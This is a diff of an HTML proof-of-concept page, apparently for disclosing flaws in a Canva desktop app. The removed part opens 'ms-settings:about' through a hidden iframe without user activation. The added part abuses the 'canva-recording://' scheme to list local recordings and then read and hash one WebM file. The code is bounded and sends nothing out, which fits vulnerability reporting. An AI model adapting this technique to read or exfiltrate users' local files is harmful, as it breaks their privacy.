@@ -1,24 +1,205 @@
 <!doctype html>
 <html lang="en">
-<meta charset="utf-8">
-<title>Canva owned URI activation check</title>
-<style>
-  body { font: 16px/1.45 system-ui, sans-serif; margin: 2rem; max-width: 48rem; }
-  code, pre { font-family: ui-monospace, monospace; }
-  #status { border: 1px solid #888; padding: 1rem; white-space: pre-wrap; }
-</style>
-<h1>Owned URI activation check</h1>
-<p>This page makes one automatic, harmless attempt to open the Windows About settings page. It sends no data and changes no setting.</p>
-<pre id="status">Waiting 1500 ms…</pre>
-<script>
-setTimeout(() => {
-  const frame = document.createElement("iframe");
-  frame.hidden = true;
-  frame.src = "ms-settings:about";
-  document.body.append(frame);
-  document.querySelector("#status").textContent =
-    "Attempted one hidden subframe navigation to ms-settings:about\n" +
-    "No click or user activation was requested.";
-}, 1500);
-</script>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="Content-Security-Policy"
+          content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; connect-src canva-recording:">
+    <title>Owned Canva recording disclosure validation</title>
+    <style>
+      body { font: 16px/1.45 system-ui, sans-serif; margin: 2rem; }
+      button { font: inherit; padding: .65rem 1rem; }
+      pre { white-space: pre-wrap; overflow-wrap: anywhere; }
+    </style>
+  </head>
+  <body>
+    <h1>Owned recording validation</h1>
+    <p>
+      This diagnoses the owned recording count without showing names or
+      tokens. It reads and locally hashes a file only when exactly one short,
+      tester-owned WebM exists. It sends nothing anywhere.
+    </p>
+    <button id="run" type="button">Run one owned-recording test</button>
+    <pre id="result">Not started</pre>
+    <script>
+      "use strict";
+
+      const button = document.querySelector("#run");
+      const result = document.querySelector("#result");
+      const base = "canva-recording://app/recording/";
+      const missingId = "00000000-0000-0000-0000-000000000000";
+      const maxBytes = 32 * 1024 * 1024;
+      const uuid =
+        /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
+      let consumed = false;
+
+      function show(state, outcome, extra = {}) {
+        result.textContent = JSON.stringify(
+          {
+            ...state,
+            ...extra,
+            outcome,
+            uploaded: false,
+            played: false,
+            decoded: false,
+            storedByPoc: false,
+          },
+          null,
+          2,
+        );
+      }
+
+      function safeErrorName(error) {
+        const allowed = new Set([
+          "AbortError",
+          "DataError",
+          "NetworkError",
+          "NotAllowedError",
+          "NotFoundError",
+          "SecurityError",
+          "TypeError",
+        ]);
+        return error instanceof Error && allowed.has(error.name)
+          ? error.name
+          : "UnexpectedError";
+      }
+
+      button.addEventListener("click", async () => {
+        if (consumed) return;
+        consumed = true;
+        button.disabled = true;
+        result.textContent = "Running one bounded local test…";
+
+        const state = {
+          origin: location.origin,
+          listStatus: null,
+          listResponseType: null,
+          recordingCount: null,
+          tokenCandidateCount: null,
+          fileReadAttempted: false,
+        };
+
+        try {
+          const listingResponse = await fetch(base + missingId);
+          state.listStatus = listingResponse.status;
+          state.listResponseType = listingResponse.type;
+          if (listingResponse.status !== 404) {
+            show(state, "unexpected-list-status-no-file-read");
+            return;
+          }
+
+          let listing;
+          try {
+            listing = await listingResponse.json();
+          } catch {
+            show(state, "listing-response-was-not-json");
+            return;
+          }
+          if (!Array.isArray(listing.files)) {
+            show(state, "listing-files-array-missing");
+            return;
+          }
+
+          state.recordingCount = listing.files.length;
+          if (state.recordingCount === 0) {
+            show(state, "empty-list-no-file-read");
+            return;
+          }
+          if (state.recordingCount > 1) {
+            show(state, "multiple-recordings-no-file-read");
+            return;
+          }
+
+          const unique = new Map();
+          for (const file of listing.files) {
+            for (const [field, token] of [["id", file.id], ["name", file.name]]) {
+              if (
+                typeof token !== "string" ||
+                token === "__undefined__" ||
+                !uuid.test(token)
+              ) {
+                continue;
+              }
+              const prior = unique.get(token);
+              unique.set(token, prior ? `${prior}+${field}` : field);
+            }
+          }
+          state.tokenCandidateCount = unique.size;
+          if (unique.size !== 1) {
+            show(state, "one-entry-token-set-not-unique");
+            return;
+          }
+
+          const [[token, selectedField]] = unique;
+          state.fileReadAttempted = true;
+          const recordingResponse = await fetch(base + token);
+          state.selectedField = selectedField;
+          state.readStatus = recordingResponse.status;
+          state.readResponseType = recordingResponse.type;
+          state.mime = recordingResponse.headers.get("content-type");
+          if (!recordingResponse.ok) {
+            show(state, "single-owned-recording-not-readable");
+            return;
+          }
+          if (state.mime !== "video/webm") {
+            show(state, "unexpected-mime-no-body-read");
+            return;
+          }
+          if (!recordingResponse.body) {
+            show(state, "readable-stream-missing");
+            return;
+          }
+
+          const reader = recordingResponse.body.getReader();
+          const chunks = [];
+          let byteLength = 0;
+          for (;;) {
+            const { done, value } = await reader.read();
+            if (done) break;
+            if (!(value instanceof Uint8Array)) {
+              await reader.cancel();
+              show(state, "unexpected-stream-chunk-type");
+              return;
+            }
+            if (byteLength + value.byteLength > maxBytes) {
+              await reader.cancel();
+              show(state, "owned-webm-over-32mib-aborted", {
+                byteLengthBeforeAbort: byteLength,
+              });
+              return;
+            }
+            chunks.push(value);
+            byteLength += value.byteLength;
+          }
+          if (byteLength === 0) {
+            show(state, "owned-webm-empty");
+            return;
+          }
+
+          const bytes = new Uint8Array(byteLength);
+          let offset = 0;
+          for (const chunk of chunks) {
+            bytes.set(chunk, offset);
+            offset += chunk.byteLength;
+          }
+          const digestBytes = new Uint8Array(
+            await crypto.subtle.digest("SHA-256", bytes),
+          );
+          const sha256 = Array.from(digestBytes, (byte) =>
+            byte.toString(16).padStart(2, "0"),
+          ).join("");
+
+          show(state, "single-owned-webm-read-and-hashed", {
+            byteLength,
+            sha256,
+          });
+        } catch (error) {
+          show(state, "request-failed", {
+            errorName: safeErrorName(error),
+          });
+        }
+      });
+    </script>
+  </body>
 </html>
